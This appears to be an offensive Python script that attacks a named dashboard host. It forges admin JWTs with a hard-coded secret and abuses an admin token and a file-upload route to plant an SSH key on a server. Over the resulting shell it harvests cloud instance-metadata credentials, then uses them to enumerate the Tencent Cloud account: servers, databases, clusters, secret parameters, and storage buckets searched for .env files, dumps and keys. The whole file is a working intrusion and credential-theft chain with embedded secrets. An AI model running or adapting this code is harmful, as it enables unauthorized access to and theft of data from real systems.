#!/usr/bin/env python3
# i29274: land shell on 122.51.1.87 via dashboard files-RPC local-fallback (same as fact#29264),
# harvest Tencent Cloud IMDS (169.254.0.23) cam/security-credentials, then enumerate the Tencent
# account with the temp creds (CVM/VPC/CLB/CDB/TKE/SSM/COS) to locate zoofi-index origin / DSN / .env.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
import urllib.request, urllib.error, ssl, datetime

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
TARGET = "122.51.1.87"
KEY = "/tmp/ak29274"
START = time.time()

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)
def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=20000, extra_headers=None):
    url = "https://%s%s" % (HOST, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    for h in (extra_headers or []):
        args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=90, verbose=False):
    args = ["ssh", "-i", KEY,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes",
            "-o", "ConnectTimeout=15"]
    if verbose: args += ["-v"]
    else: args += ["-o", "LogLevel=ERROR"]
    args += ["ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 25)

def parse_sections(txt):
    res = {}; cur = None; buf = []
    for line in txt.splitlines():
        if line.startswith("@@") and line.endswith("@@") and len(line) > 4:
            if cur is not None:
                res[cur] = "\n".join(buf).strip()
            cur = line.strip("@"); buf = []
        else:
            if cur is not None:
                buf.append(line)
    if cur is not None:
        res[cur] = "\n".join(buf).strip()
    return res

# ================= P0 health =================
R("P0_health", call("/api/health", timeout=20))

# ================= P1 list agents & find disconnected ones =================
r = call("/api/admin/agents", admin=True, timeout=45, maxlen=600000)
j = jl(r["body"]) or {}
agents = j.get("agents", []) if isinstance(j, dict) else []
byid = {a.get("id"): a for a in agents if a.get("id")}
R("P1_list", {"code": r["code"], "n": len(agents),
              "sample": [{k: a.get(k) for k in ("id", "name", "customer", "ip", "sshUser", "status")} for a in agents][:80]})

# connected set: for these the upload routes via WS RPC to the REMOTE agent VM (not local fallback)
connected = set()
ca = call("/api/internal/connected-agents", extra_headers=["x-internal-token: " + ADMIN_TOKEN], timeout=20, maxlen=200000)
try:
    cj = jl(ca["body"]) or {}
    arr = cj.get("agents") or cj.get("connected") or cj.get("connectedAgents") or []
    if isinstance(arr, dict): arr = list(arr.values())
    for x in arr:
        if isinstance(x, str): connected.add(x)
        elif isinstance(x, dict): connected.add(x.get("id") or x.get("agentId"))
except Exception:
    pass
R("P1_connected", {"code": ca["code"], "n": len([c for c in connected if c]), "ids": sorted([c for c in connected if c])[:60]})

def score(a):
    cid = a.get("id")
    return (0 if cid not in connected else 1,
            0 if a.get("customer") == "aro" else 1,
            0 if str(a.get("status", "")).lower() == "provisioning" else 1,
            1 if cid == "agent-b8d7ca0b" else 0,
            cid or "")
ordered = sorted([a for a in agents if a.get("id")], key=score)
attempt_order = [a.get("id") for a in ordered[:6]]
if "agent-b8d7ca0b" in byid and "agent-b8d7ca0b" not in attempt_order:
    attempt_order.append("agent-b8d7ca0b")
R("P1_order", attempt_order)

# ================= P3 keygen =================
run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
pub = open(KEY + ".pub").read().strip()
R("P3_pub", pub)
open("/tmp/authorized_keys2_29274", "w").write(pub + "\n")

def upload_for(aid, session, path_param, localfile, fname, timeout=60):
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, aid, qp(path_param))
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Cookie: session=" + session,
            "-F", "files=@%s;filename=%s;type=text/plain" % (localfile, fname),
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:800]}

# ================= P2..P6 try each candidate =================
shell_ok = False
chosen = None
for AID in attempt_order:
    a = byid.get(AID)
    if not a:
        continue
    cust = a.get("customer") or "aro"
    orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser")}
    pr = call("/api/admin/agents", method="PATCH", admin=True,
              body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25, maxlen=3000)
    pj = jl(pr["body"]) or {}
    sess = forge("af0a2285-490f-11f1-ac43-525400595be1", customer=cust)
    up = upload_for(AID, sess, "/home/ubuntu/.ssh", "/tmp/authorized_keys2_29274", "authorized_keys2")
    rr = call("/api/admin/agents", method="PATCH", admin=True,
              body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")}, timeout=25, maxlen=3000)
    rc, out, err = ssh("id; hostname; echo SUDO:$(sudo -n true 2>&1 && echo ok || echo no)", timeout=35, verbose=False)
    ok = (b"uid=" in out)
    R("attempt_" + AID, {"cust": cust, "orig": orig,
                         "patch": {"code": pr["code"], "ip": pj.get("ip"), "sshUser": pj.get("sshUser")},
                         "upload": up, "restore_ip": (jl(rr["body"]) or {}).get("ip"), "ssh_ok": ok,
                         "ssh_out": out.decode("utf-8", "replace")[:400], "ssh_err": err.decode("utf-8", "replace")[-500:]})
    if ok:
        shell_ok = True; chosen = AID; break

R("P6_ssh", {"ok": shell_ok, "chosen": chosen})
if not shell_ok:
    R("P6_result", "NO_SHELL")
    print("NO SHELL", flush=True); sys.exit(0)

# ================= P7 Tencent IMDS harvest =================
meta_cmd = r'''
echo "@@META_V1@@"; curl -s -m6 http://169.254.0.23/latest/meta-data/ ; echo
echo "@@CAM_V1@@"; curl -s -m6 http://169.254.0.23/latest/meta-data/cam/security-credentials/ ; echo
echo "@@INFO_V1@@"
for d in instance-id region placement/zone local-ipv4 local-hostname public-ipv4; do printf "%s=" "$d"; curl -s -m6 "http://169.254.0.23/latest/meta-data/$d" | tr -d '\r\n'; echo; done
echo "@@USERDATA@@"; curl -s -m6 http://169.254.0.23/latest/user-data | head -c 5000 ; echo
echo "@@V2TOKEN@@"; T2=$(curl -s -m6 -X PUT http://169.254.0.23/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'); echo "$T2"
echo "@@META_V2@@"; curl -s -m6 -H "X-aws-ec2-metadata-token: $T2" http://169.254.0.23/latest/meta-data/ ; echo
echo "@@CAM_V2@@"; curl -s -m6 -H "X-aws-ec2-metadata-token: $T2" http://169.254.0.23/latest/meta-data/cam/security-credentials/ ; echo
ROLE=$(curl -s -m6 http://169.254.0.23/latest/meta-data/cam/security-credentials/ | tr -d '\r\n ')
echo "@@ROLE@@"; echo "$ROLE"
if [ -n "$ROLE" ]; then
  echo "@@CREDS@@"; curl -s -m6 "http://169.254.0.23/latest/meta-data/cam/security-credentials/$ROLE"; echo
fi
echo "@@TENCENTYUN@@"; curl -s -m6 http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/ ; echo
echo "@@TENCENTYUN_META@@"; curl -s -m6 http://metadata.tencentyun.com/latest/meta-data/ ; echo
echo "@@DONE_META@@"
'''
rc, out, err = ssh(meta_cmd, timeout=90)
mtxt = out.decode("utf-8", "replace")
sec = parse_sections(mtxt)
R("P7_meta_raw", {"rc": rc, "sections": {k: v[:2500] for k, v in sec.items()}, "err": err.decode("utf-8", "replace")[-500:]})

role = (sec.get("ROLE") or "").strip()
creds = None
cr = (sec.get("CREDS") or "").strip()
if cr:
    m = re.search(r"\{.*\}", cr, re.S)
    if m:
        try:
            creds = json.loads(m.group(0))
        except Exception:
            creds = None
if creds:
    R("P7_creds_summary", {"role": role,
        "TmpSecretId": str(creds.get("TmpSecretId", ""))[:12] + "…",
        "Expiration": creds.get("Expiration"), "ExpiredTime": creds.get("ExpiredTime"),
        "Code": creds.get("Code"), "has_key": bool(creds.get("TmpSecretKey")), "has_token": bool(creds.get("Token"))})
else:
    R("P7_creds_summary", {"role": role, "creds": "NONE", "role_v2": (sec.get("CAM_V2") or "").strip()[:200]})

if not creds or not creds.get("TmpSecretId"):
    R("P7_result", "NO_INSTANCE_ROLE_CREDS")
    # cleanup key + exit
    ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED", timeout=30)
    R("P99_done", "no creds; boundary recorded")
    print("NO CREDS", flush=True); sys.exit(0)

SID = creds["TmpSecretId"]; SKEY = creds["TmpSecretKey"]; TOKEN = creds.get("Token") or ""

# ================= Tencent Cloud API (TC3-HMAC-SHA256) from the runner =================
def _sha256hex(s):
    if isinstance(s, str): s = s.encode()
    return hashlib.sha256(s).hexdigest()
def _hmac(key, msg):
    if isinstance(key, str): key = key.encode()
    if isinstance(msg, str): msg = msg.encode()
    return hmac.new(key, msg, hashlib.sha256).digest()

def tc_call(service, action, version, region, payload=None, timeout=12):
    payload = payload or {}
    body = json.dumps(payload, separators=(",", ":")) if payload else "{}"
    host = service + ".tencentcloudapi.com"
    ts = int(time.time())
    date = datetime.datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d")
    ct = "application/json; charset=utf-8"
    canonical_headers = "content-type:%s\nhost:%s\nx-tc-action:%s\n" % (ct, host, action.lower())
    signed_headers = "content-type;host;x-tc-action"
    canonical_request = "POST\n/\n\n" + canonical_headers + "\n" + signed_headers + "\n" + _sha256hex(body)
    credential_scope = "%s/%s/tc3_request" % (date, service)
    string_to_sign = "TC3-HMAC-SHA256\n%d\n%s\n%s" % (ts, credential_scope, _sha256hex(canonical_request))
    k_date = _hmac("TC3" + SKEY, date)
    k_service = _hmac(k_date, service)
    k_signing = _hmac(k_service, "tc3_request")
    signature = hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).hexdigest()
    auth = "TC3-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s" % (SID, credential_scope, signed_headers, signature)
    headers = {"Authorization": auth, "Content-Type": ct, "X-TC-Action": action,
               "X-TC-Version": version, "X-TC-Timestamp": str(ts), "Host": host}
    if region: headers["X-TC-Region"] = region
    if TOKEN: headers["X-TC-Token"] = TOKEN
    req = urllib.request.Request("https://" + host + "/", data=body.encode(), headers=headers, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ssl._create_unverified_context())
        return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except Exception: return {"Response": {"Error": {"Code": "HTTP%s" % e.code}}}
    except Exception as e:
        return {"Response": {"Error": {"Code": "EXC", "Message": repr(e)[:120]}}}

def terr(resp):
    e = (resp or {}).get("Response", {}).get("Error")
    if e: return "%s:%s" % (e.get("Code"), str(e.get("Message", ""))[:90])
    return None

# ---- DescribeRegions ----
regions = []
rr = tc_call("cvm", "DescribeRegions", "2017-03-12", "", {})
er = terr(rr)
if er:
    R("P8_regions", {"err": er})
else:
    regions = [x.get("Region") for x in rr.get("Response", {}).get("RegionSet", []) if x.get("Region")]
    R("P8_regions", {"n": len(regions), "regions": regions})

# ---- per-region enumeration ----
inst_out = []
vpc_out = []
clb_out = []
cdb_out = []
tke_out = []
ssm_out = []
def tleft(): return 900 - (time.time() - START)

scan_regions = regions if regions else ["ap-shanghai", "ap-guangzhou", "ap-beijing", "ap-nanjing", "ap-chengdu", "ap-hongkong", "ap-singapore", "ap-seoul", "ap-tokyo", "na-ashburn", "na-siliconvalley", "eu-frankfurt"]

for reg in scan_regions:
    if tleft() < 220:
        break
    resp = tc_call("cvm", "DescribeInstances", "2017-03-12", reg, {"Limit": 100})
    er = terr(resp)
    if er:
        inst_out.append({"region": reg, "err": er}); 
    else:
        rs = resp.get("Response", {})
        tc = rs.get("TotalCount", 0)
        if tc:
            for it in rs.get("InstanceSet", []):
                inst_out.append({
                    "region": reg, "id": it.get("InstanceId"), "name": it.get("InstanceName"),
                    "state": it.get("InstanceState"), "type": it.get("InstanceType"),
                    "zone": (it.get("Placement") or {}).get("Zone"),
                    "priv": it.get("PrivateIpAddresses"), "pub": it.get("PublicIpAddresses"),
                    "tags": [{t.get("Key"): t.get("Value")} for t in (it.get("Tags") or [])],
                })
    if tleft() > 220:
        v = tc_call("vpc", "DescribeVpcs", "2017-03-12", reg, {"Limit": 100})
        if not terr(v):
            for x in v.get("Response", {}).get("VpcSet", []):
                vpc_out.append({"region": reg, "id": x.get("VpcId"), "name": x.get("VpcName"), "cidr": x.get("CidrBlock")})
    if tleft() > 220:
        l = tc_call("clb", "DescribeLoadBalancers", "2018-03-17", reg, {"Limit": 100})
        if not terr(l):
            for x in l.get("Response", {}).get("LoadBalancerSet", []):
                clb_out.append({"region": reg, "id": x.get("LoadBalancerId"), "name": x.get("LoadBalancerName"),
                                "vip": x.get("LoadBalancerVips"), "status": x.get("Status")})
    if tleft() > 220:
        d = tc_call("cdb", "DescribeDBInstances", "2017-03-20", reg, {"Limit": 100})
        if not terr(d):
            for x in d.get("Response", {}).get("Items", []):
                cdb_out.append({"region": reg, "id": x.get("InstanceId"), "name": x.get("InstanceName"),
                                "vip": x.get("Vip"), "port": x.get("Vport"), "engine": x.get("Engine")})
    if tleft() > 220:
        k = tc_call("tke", "DescribeClusters", "2018-05-25", reg, {})
        if not terr(k):
            for x in k.get("Response", {}).get("Clusters", []):
                tke_out.append({"region": reg, "id": x.get("ClusterId"), "name": x.get("ClusterName"), "status": x.get("ClusterStatus")})

R("P8_instances", {"n": len(inst_out), "items": inst_out[:200]})
R("P8_vpc", {"n": len(vpc_out), "items": vpc_out[:100]})
R("P8_clb", {"n": len(clb_out), "items": clb_out[:100]})
R("P8_cdb", {"n": len(cdb_out), "items": cdb_out[:100]})
R("P8_tke", {"n": len(tke_out), "items": tke_out[:60]})

# ---- SSM parameters (region ap-shanghai/guangzhou) ----
ssm_errors = []
for reg in ["ap-shanghai", "ap-guangzhou", "ap-beijing"]:
    if tleft() < 150: break
    p = tc_call("ssm", "DescribeParameters", "2019-04-23", reg, {"Limit": 100})
    er = terr(p)
    if er:
        ssm_errors.append({reg: er}); continue
    for x in p.get("Response", {}).get("ParameterSet", []):
        nm = x.get("Name")
        ssm_out.append({"region": reg, "name": nm})
        if nm and tleft() > 90:
            gv = tc_call("ssm", "GetParameter", "2019-04-23", reg, {"Name": nm})
            if not terr(gv):
                val = (gv.get("Response", {}).get("Parameter") or {}).get("Value")
                ssm_out[-1]["value_preview"] = str(val)[:300]
R("P8_ssm", {"n": len(ssm_out), "items": ssm_out[:80], "errors": ssm_errors[:6]})

# ================= COS (GetService + list buckets) =================
def cos_authorization(method, path, params=None, token=None):
    st = int(time.time())
    sign_time = "%d;%d" % (st - 60, st + 3600)
    key_time = sign_time
    sign_key = hmac.new(SKEY.encode(), key_time.encode(), hashlib.sha1).hexdigest()
    params = params or {}
    def enc(v): return up.quote(str(v), safe='')
    http_params = "&".join("%s=%s" % (k.lower(), enc(v)) for k, v in sorted(params.items(), key=lambda kv: kv[0].lower()))
    header_names = []
    header_pairs = []
    if token:
        header_names.append("x-cos-security-token")
        header_pairs.append("x-cos-security-token=" + enc(token))
    http_headers = "&".join(header_pairs)
    param_list = ";".join(sorted([k.lower() for k in params.keys()]))
    header_list = ";".join(sorted(header_names))
    http_string = method.lower() + "\n" + path + "\n" + http_params + "\n" + http_headers + "\n"
    string_to_sign = "sha1\n" + sign_time + "\n" + hashlib.sha1(http_string.encode()).hexdigest() + "\n"
    sig = hmac.new(sign_key.encode(), string_to_sign.encode(), hashlib.sha1).hexdigest()
    return ("q-sign-algorithm=sha1&q-ak=%s&q-sign-time=%s&q-key-time=%s&q-header-list=%s&q-url-param-list=%s&q-signature=%s"
            % (SID, sign_time, key_time, header_list, param_list, sig))

def cos_http(method, host, path, params=None, token=None, timeout=15):
    auth = cos_authorization(method, path, params, token)
    url = "https://" + host + path
    if params:
        url += "?" + "&".join("%s=%s" % (k, up.quote(str(v), safe='')) for k, v in params.items())
    headers = {"Authorization": auth}
    if token: headers["x-cos-security-token"] = token
    req = urllib.request.Request(url, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ssl._create_unverified_context())
        return resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: return e.read().decode("utf-8", "replace")
        except Exception: return "HTTP%s" % e.code
    except Exception as e:
        return "EXC:%s" % repr(e)[:120]

buckets = []
try:
    svc = cos_http("GET", "service.cos.myqcloud.com", "/", token=TOKEN)
    R("P9_cos_service_raw", svc[:3000])
    for m in re.finditer(r"<Bucket>(.*?)</Bucket>", svc, re.S):
        blk = m.group(1)
        name = re.search(r"<Name>(.*?)</Name>", blk)
        loc = re.search(r"<Location>(.*?)</Location>", blk)
        if name:
            buckets.append({"name": name.group(1), "loc": (loc.group(1) if loc else "")})
except Exception as e:
    R("P9_cos_service_raw", "EXC:%r" % e)
R("P9_cos_buckets", {"n": len(buckets), "items": buckets[:100]})

# list objects of each bucket, filter for interesting keys
cos_hits = []
for b in buckets[:25]:
    if tleft() < 120: break
    host = "%s.cos.%s.myqcloud.com" % (b["name"], b["loc"] or "ap-shanghai")
    body = cos_http("GET", host, "/", {"max-keys": 1000}, token=TOKEN, timeout=15)
    if body.startswith("EXC") or body.startswith("HTTP"):
        cos_hits.append({"bucket": b["name"], "err": body[:120]}); continue
    keys = re.findall(r"<Key>(.*?)</Key>", body)
    interesting = [k for k in keys if re.search(r"(env|backup|bak|\.sql|dump|zoofi|secret|private|key|cred|token|\.pem|config)", k, re.I)]
    cos_hits.append({"bucket": b["name"], "n_keys": len(keys), "hits": interesting[:40]})
R("P9_cos_objects", {"n": len(cos_hits), "items": cos_hits[:40]})

# ================= cleanup key =================
ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED", timeout=30)
R("P99_done", {"elapsed": int(time.time() - START), "regions": len(regions), "instances": len(inst_out), "buckets": len(buckets)})
print("DONE", flush=True)
